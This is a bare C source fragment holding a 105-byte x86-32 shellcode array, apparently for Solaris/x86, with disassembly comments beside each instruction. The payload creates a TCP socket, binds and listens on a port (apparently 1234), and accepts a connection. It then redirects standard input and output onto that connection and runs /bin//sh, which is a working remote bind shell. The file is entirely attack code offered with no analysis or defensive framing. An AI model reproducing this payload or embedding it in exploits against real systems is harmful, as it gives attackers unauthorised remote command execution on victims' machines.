
// Target architecture : X86 32

#define BS_SIZE 105

char BS[] = {
  /* 0000 */ "\x31\xc0"             /* xor  eax, eax        */
  /* 0002 */ "\xba\xfd\xff\xfb\x2d" /* mov  edx, 0x2dfbfffd */
  /* 0007 */ "\xf7\xd2"             /* not  edx             */
  /* 0009 */ "\x50"                 /* push eax             */
  /* 000A */ "\x52"                 /* push edx             */
  /* 000B */ "\x89\xe7"             /* mov  edi, esp        */
  /* 000D */ "\x31\xdb"             /* xor  ebx, ebx        */
  /* 000F */ "\xf7\xe3"             /* mul  ebx             */
  /* 0011 */ "\xb0\x02"             /* mov  al, 2           */
  /* 0013 */ "\x50"                 /* push eax             */
  /* 0014 */ "\x52"                 /* push edx             */
  /* 0015 */ "\x52"                 /* push edx             */
  /* 0016 */ "\x50"                 /* push eax             */
  /* 0017 */ "\x50"                 /* push eax             */
  /* 0018 */ "\x50"                 /* push eax             */
  /* 0019 */ "\xb0\xe6"             /* mov  al, 0xe6        */
  /* 001B */ "\xcd\x91"             /* int  0x91            */
  /* 001D */ "\x93"                 /* xchg eax, ebx        */
  /* 001E */ "\x6a\x10"             /* push 0x10            */
  /* 0020 */ "\x57"                 /* push edi             */
  /* 0021 */ "\x53"                 /* push ebx             */
  /* 0022 */ "\x52"                 /* push edx             */
  /* 0023 */ "\xb0\xe8"             /* mov  al, 0xe8        */
  /* 0025 */ "\xcd\x91"             /* int  0x91            */
  /* 0027 */ "\x52"                 /* push edx             */
  /* 0028 */ "\x53"                 /* push ebx             */
  /* 0029 */ "\x52"                 /* push edx             */
  /* 002A */ "\xb0\xe9"             /* mov  al, 0xe9        */
  /* 002C */ "\xcd\x91"             /* int  0x91            */
  /* 002E */ "\x52"                 /* push edx             */
  /* 002F */ "\x53"                 /* push ebx             */
  /* 0030 */ "\x6a\x02"             /* push 2               */
  /* 0032 */ "\xb0\xea"             /* mov  al, 0xea        */
  /* 0034 */ "\xcd\x91"             /* int  0x91            */
  /* 0036 */ "\x93"                 /* xchg eax, ebx        */
  /* 0037 */ "\x92"                 /* xchg eax, edx        */
  /* 0038 */ "\x99"                 /* cdq                  */
  /* 0039 */ "\x59"                 /* pop  ecx             */
  /* 003A */ "\x51"                 /* push ecx             */
  /* 003B */ "\x52"                 /* push edx             */
  /* 003C */ "\xb0\x06"             /* mov  al, 6           */
  /* 003E */ "\xcd\x91"             /* int  0x91            */
  /* 0040 */ "\x51"                 /* push ecx             */
  /* 0041 */ "\x6a\x09"             /* push 9               */
  /* 0043 */ "\x53"                 /* push ebx             */
  /* 0044 */ "\x52"                 /* push edx             */
  /* 0045 */ "\xb0\x3e"             /* mov  al, 0x3e        */
  /* 0047 */ "\xcd\x91"             /* int  0x91            */
  /* 0049 */ "\x83\xc4\x18"         /* add  esp, 0x18       */
  /* 004C */ "\x49"                 /* dec  ecx             */
  /* 004D */ "\x79\xeb"             /* jns  0x3a            */
  /* 004F */ "\x52"                 /* push edx             */
  /* 0050 */ "\x68\x2f\x2f\x73\x68" /* push 0x68732f2f      */
  /* 0055 */ "\x68\x2f\x62\x69\x6e" /* push 0x6e69622f      */
  /* 005A */ "\x89\xe3"             /* mov  ebx, esp        */
  /* 005C */ "\x52"                 /* push edx             */
  /* 005D */ "\x53"                 /* push ebx             */
  /* 005E */ "\x89\xe1"             /* mov  ecx, esp        */
  /* 0060 */ "\x52"                 /* push edx             */
  /* 0061 */ "\x52"                 /* push edx             */
  /* 0062 */ "\x51"                 /* push ecx             */
  /* 0063 */ "\x53"                 /* push ebx             */
  /* 0064 */ "\x52"                 /* push edx             */
  /* 0065 */ "\xb0\x3b"             /* mov  al, 0x3b        */
  /* 0067 */ "\xcd\x91"             /* int  0x91            */
};